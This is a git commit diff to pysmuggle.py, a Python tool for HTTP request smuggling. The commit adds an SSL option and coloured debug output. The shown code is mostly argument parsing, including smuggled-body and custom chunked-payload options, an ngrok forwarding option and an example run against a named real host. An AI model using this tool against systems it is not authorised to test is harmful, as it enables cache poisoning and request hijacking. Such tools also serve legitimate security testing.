1e5a3f78819f330e0faa266f31c810f2bac7085d
max goldstein <mgoldstein1998@gmail.com>
2021-09-05 17:24:38 -0500

    minor bugfixes

--- pysmuggle.py
+++ pysmuggle.py
@@ -10,7 +10,7 @@ import requests
 if __name__ == '__main__':
     cp = ColorPallete()
     request_headers = {}
-    parser = argparse.ArgumentParser(description="Send (malformed) http requests to a host.\n\nExample: python3 smuggle.py --host stallman.org --request-headers \"Transfer-Encoding:chunked,Content-Type:text/html\" --smuggled-body-fields \"\" --body-data \"\" --port 443 --debug 1")
+    parser = argparse.ArgumentParser(description="Send (malformed) http requests to a host.\n\nExample: python3 pysmuggle.py --host stallman.org --request-headers \"Transfer-Encoding:chunked,Content-Type:text/html\" --smuggled-body-fields \"\" --body-data \"\" --port 443 --debug 1")
     parser.add_argument('--host', type=str, nargs='?',help='target host')
     parser.add_argument('--port', type=int, nargs='?',help='target port on host')
     parser.add_argument('--ngrok', type=str, nargs='?',help='ngrok url for forward/redirected/smuggled requests')
@@ -23,6 +23,7 @@ if __name__ == '__main__':
     parser.add_argument('--body-data', type=str, nargs='?',help='request body data, enclosed within \"\" if contains whitespaces')
     parser.add_argument('--body-length', type=str, nargs='?',help='set the content-length of the request body to arbitrary size')
     parser.add_argument('--smuggled-body-fields',type=str,nargs='?', help='headers, enclosed within \"\" for a smuggled request witin the body of the main http request')
+    parser.add_argument('--use-ssl', type=str, nargs='?', help='option to configure socket to communicate over SSL with the remote host')
     parser.add_argument('--custom-body-payload',type=str,nargs='?',help='option to set the request body explicitly using a string enclosed in \"\". example: --custom-body-payload \"length=5;body=5e\\r\\nPOST / HTTP/1.1\\r\\n\\r\\n\" or --custom-body-payload \"5;5e\\r\\nPOST / HTTP/1.1\\r\\n\"')
     parser.add_argument('--prefix',type=str,nargs='?',help='prefix to prepend to request body data')
     args = parser.parse_args()
@@ -36,7 +37,7 @@ if __name__ == '__main__':
         if k == 'debug' and v == None:
             args.debug = True
         elif k == 'debug' and v != None:
-            args.debug = False if v in ['False','false','0','off','none'] else v in ['True','true','1','on','all'] 
+            args.debug = False if v in ['False','false','0','off','none','no'] else v in ['True','true','1','yes','on','all'] 
         if k == 'endpoint' and v == None:
             args.endpoint = '/'
         if k == 'method' and v == None:
@@ -87,11 +88,18 @@ if __name__ == '__main__':
             args.prefix = PREFIX
         elif k == 'prefix' and v != None:
             args.prefix = v
+        if k == 'use_ssl' and v == None:
+            args.use_ssl = True
+        elif k == 'use_ssl' and v != None:
+            args.use_ssl = False if v in ['False','false','no','off','0'] else v in ['True','true','yes','1','on']
     if args.debug:
-        print('Got arguments: ')
+        cp.log(color='yellow',msg='Got arguments: ')
         for k,v in args._get_kwargs():
-            print('\t{}: {}'.format(k,v))
-
+            cp.set_color(color='yellow')
+            print('\t{}:'.format(k),end='')
+            cp.set_color(color='purple')
+            print('{} '.format(v))
+            cp.set_color(color='reset')
     try:
         wr = WebRequest(host=args.host,
                         port=args.port,
@@ -108,7 +116,7 @@ if __name__ == '__main__':
         else:
             wr.make_body(data=(args.prefix+args.body_data),options=args.smuggled_body_fields,use_body_len=use_body_len,length=args.body_length)
         msg = wr.make_request_msg()
-        wr.connect()
+        wr.connect(use_ssl=args.use_ssl)
         wr.send(msg)
         wr.recv()
     except Exception as e:
